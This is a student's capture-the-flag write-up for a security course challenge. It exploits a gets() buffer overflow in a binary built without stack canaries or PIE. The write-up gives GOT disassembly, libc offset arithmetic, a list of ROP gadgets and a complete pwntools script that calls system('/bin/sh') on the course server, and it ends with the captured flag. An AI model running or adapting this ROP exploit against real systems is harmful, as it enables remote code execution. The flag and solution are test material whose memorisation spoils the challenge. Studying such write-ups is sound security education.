# Player
- Tim Niklas Gruel 1080 2021 2831
- username: realy0sh1

# Writeup: "nuggets"
- story:  no story :/
- start docker:
```
docker compose up
nc 127.0.0.1 1024
```
- the c file allows for an buffer overflow (gets write into buffer until newline):
```
int main(void)
{
    char buffer[16];
    gets(buffer);
}
```
- compiler flags say no canary (-fno-stack-protector) and no ASLR (-no-pie)
- the library includes libc (which has ASLR enabled), but as vuln does not have ASLR enabled, the global offset table is at a well knwon address
```
.got:000000000041BF40 ; ===========================================================================
.got:000000000041BF40
.got:000000000041BF40 ; Segment type: Pure data
.got:000000000041BF40 ; Segment permissions: Read/Write
.got:000000000041BF40 _got            segment qword public 'DATA' use64
.got:000000000041BF40                 assume cs:_got
.got:000000000041BF40                 ;org 41BF40h
.got:000000000041BF40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got:000000000041BF48 qword_41BF48    dq 0                    ; DATA XREF: sub_401020↑r
.got:000000000041BF50 qword_41BF50    dq 0                    ; DATA XREF: sub_401020+6↑r
.got:000000000041BF58 __snprintf_chk_ptr dq offset __snprintf_chk
.got:000000000041BF58                                         ; DATA XREF: ___snprintf_chk↑r
.got:000000000041BF60 free_ptr        dq offset free          ; DATA XREF: _free↑r
.got:000000000041BF68 __errno_location_ptr dq offset __errno_location
.got:000000000041BF68                                         ; DATA XREF: ___errno_location↑r
.got:000000000041BF70 write_ptr       dq offset write         ; DATA XREF: _write↑r
.got:000000000041BF78 strlen_ptr      dq offset strlen        ; DATA XREF: _strlen↑r
.got:000000000041BF80 __stack_chk_fail_ptr dq offset __stack_chk_fail
.got:000000000041BF80                                         ; DATA XREF: ___stack_chk_fail↑r
.got:000000000041BF88 snprintf_ptr    dq offset snprintf      ; DATA XREF: _snprintf↑r
.got:000000000041BF90 memset_ptr      dq offset memset        ; DATA XREF: _memset↑r
.got:000000000041BF98 close_ptr       dq offset close         ; DATA XREF: _close↑r
.got:000000000041BFA0 memchr_ptr      dq offset memchr        ; DATA XREF: _memchr↑r
.got:000000000041BFA8 read_ptr        dq offset read          ; DATA XREF: _read↑r
.got:000000000041BFB0 memcpy_ptr      dq offset memcpy        ; DATA XREF: _memcpy↑r
.got:000000000041BFB8 gets_ptr        dq offset gets          ; DATA XREF: _gets↑r
.got:000000000041BFC0 malloc_ptr      dq offset malloc        ; DATA XREF: _malloc↑r
.got:000000000041BFC8 __vsnprintf_chk_ptr dq offset __vsnprintf_chk
.got:000000000041BFC8                                         ; DATA XREF: ___vsnprintf_chk↑r
.got:000000000041BFD0 memmove_ptr     dq offset memmove       ; DATA XREF: _memmove↑r
.got:000000000041BFD8 open_ptr        dq offset open          ; DATA XREF: _open↑r
.got:000000000041BFE0 lseek64_ptr     dq offset lseek64       ; DATA XREF: _lseek64↑r
.got:000000000041BFE8 strerror_ptr    dq offset strerror      ; DATA XREF: _strerror↑r
.got:000000000041BFF0 __libc_start_main_ptr dq offset __libc_start_main
.got:000000000041BFF0                                         ; DATA XREF: _start+1B↑r
.got:000000000041BFF8 __gmon_start___ptr dq offset __gmon_start__
.got:000000000041BFF8                                         ; DATA XREF: _init_proc+4↑r
.got:000000000041BFF8 _got            ends
.got:000000000041BFF8
```
- for example the address of the gets function is stored at address: 000000000041BFB8 (via IDA)
- the local offset of gets is: 0x76040 
- that means address_of_gets - local_offset_gets = ASLR_offset
- local offset_system: 0x4c490
- address of system: ASLR_offset + offset_system = address_of_gets - local_offset_gets + offset_system = address_of_gets - 0x76040 + 0x4c490 = address_of_gets - 0x29BB0
- address of string "/bin/sh\x00" : ASLR_offset + 0x196031 = address_of_gets - local_offset_gets + 0x196031 = address_of_gets - 0x76040 + 0x196031 = address_of_gets + 0x11FFF1
- find gadgets with ropper
```
ropper --file ./vuln
ropper --file ./vuln --search syscall
ropper --file ./vuln --inst-count 2
```
- after hours of crying I found the following gadgets and call system('/bin/sh')
```
- set rcx to value gadget g09 (0x00000000004129a3)
g01: 0x0000000000403f62: pop rdx; ret; 
g02: 0x000000000040d6c7: lea rcx, [rdx + 0x558]; sub rax, rcx; sar rax, 2; ret; 
- set rax to pointer to /bin/sh
g03: 0x0000000000403f62: pop rdx; ret; 
g04: 0x000000000040a8ee: pop rax; ret; (set stack to 0x0000000000000000)
g05: 0x0000000000410c70: mov rax, qword ptr [rdx + rax*8]; ret; 
g06: 0x0000000000403f62: pop rdx; ret; (offset to /bin/sh)
g07: 0x0000000000411937: sub rax, rdx; ret;
g07_new: 0x0000000000404ed1: add rax, rdx; ret;
- push pointer to /bin/sh to stack and call rcx
g08: 0x000000000040d2ab: push rax; mov edx, 0x1bf8; mov esi, 1; call rcx; 
- rcx is this g09
g09: 0x00000000004129a3: mov rdi, qword ptr [rsp + 8]; mov eax, dword ptr [rdi + 0x40]; add rsp, 0x18; ret; 
- then stack has instruction of next: (! now we may not modify rdi !)
g10: 0x0000000000403f62: pop rdx; ret; (set stack to got_gets 0x476040)
g11: 0x000000000040a8ee: pop rax; ret; (set stack to 0x0000000000000000)
g12: 0x0000000000410c70: mov rax, qword ptr [rdx + rax*8]; ret; 
- sub rax, 0x29BB0
g13: 0x0000000000403f62: pop rdx; ret; (set stack to 0x29BB0)
g14: 0x0000000000411937: sub rax, rdx; ret;

fil: 0x00000000004011df: nop; ret;

- now in rax is address of system() and in rdi is pointer to /bin/bash
g15: 0x0000000000401010: call rax;
```
- below is the python script that automatically exploits it:
```python
#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
conn = pwn.remote('tasks.ws24.softsec.rub.de', 33262)
#conn = pwn.remote('127.0.0.1', 1024)

# use the provided lib c
#conn = pwn.process('./vuln')
#pwn.gdb.attach(conn)

# fixed as no ASLR in binray (got offset via IDA)
adress_got_gets = 0x000000000041BFB8

libz = pwn.ELF('./vuln')

# use my libc for local testing, switch to provided one for server
#libc = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = pwn.ELF('./libc.so.6')

offset_gets = libc.symbols['gets']

offset_system = libc.symbols['system']

offset_shell_string = next(libc.search(b'/bin/sh\x00'))

# address_system = address_gets - offset_gets + offset_system
offset_to_system = offset_gets - offset_system

offset_to_shell_string = offset_shell_string - offset_gets

# address of gedgets
address_g01 = 0x0000000000403f62 # pop rdx; ret;
address_g02 = 0x000000000040d6c7 # lea rcx, [rdx + 0x558]; sub rax, rcx; sar rax, 2; ret;
address_g03 = 0x0000000000403f62 # pop rdx; ret;
address_g04 = 0x000000000040a8ee # pop rax; ret;
address_g05 = 0x0000000000410c70 # mov rax, qword ptr [rdx + rax*8]; ret;
address_g06 = 0x0000000000403f62 # pop rdx; ret;
address_g07 = 0x0000000000404ed1 # add rax, rdx; ret;
address_g08 = 0x000000000040d2ab # push rax; mov edx, 0x1bf8; mov esi, 1; call rcx;
address_g09 = 0x00000000004129a3 # mov rdi, qword ptr [rsp + 8]; mov eax, dword ptr [rdi + 0x40]; add rsp, 0x18; ret; 
address_g10 = 0x0000000000403f62 # pop rdx; ret;
address_g11 = 0x000000000040a8ee # pop rax; ret;
address_g12 = 0x0000000000410c70 # mov rax, qword ptr [rdx + rax*8]; ret;
address_g13 = 0x0000000000403f62 # pop rdx; ret;
address_g14 = 0x0000000000411937 # sub rax, rdx; ret;
address_g15 = 0x0000000000401010 # call rax;

address_fil = 0x00000000004011df # nop; ret;

rop_chain = [
    b'A'*24,
    pwn.p64(address_g01),
    pwn.p64(address_g09 - 0x558),
    pwn.p64(address_g02),
    pwn.p64(address_g03),
    pwn.p64(adress_got_gets),
    pwn.p64(address_g04),
    pwn.p64(0x0),
    pwn.p64(address_g05),
    pwn.p64(address_g06),
    pwn.p64(offset_to_shell_string),
    pwn.p64(address_g07),
    pwn.p64(address_g08),
    b'A'*8,
    pwn.p64(address_g10),
    pwn.p64(adress_got_gets),
    pwn.p64(address_g11),
    pwn.p64(0x0),
    pwn.p64(address_g12),
    pwn.p64(address_g13),
    pwn.p64(offset_to_system),
    pwn.p64(address_g14),

    pwn.p64(address_fil), # we need to pad sothat call is 16bit alligned

    pwn.p64(address_g15)
]

rop_chain = b''.join(gadget for gadget in rop_chain)

print(rop_chain.hex())

conn.sendline(rop_chain)
conn.interactive()
exit()

```
- flag
```
softsec{s2sKJ-xag9TRXSzvvWbr4MDH7_0ZW4zRkQY3RAFhAXbgay-FKhah4J-mgHAfgdu6}
```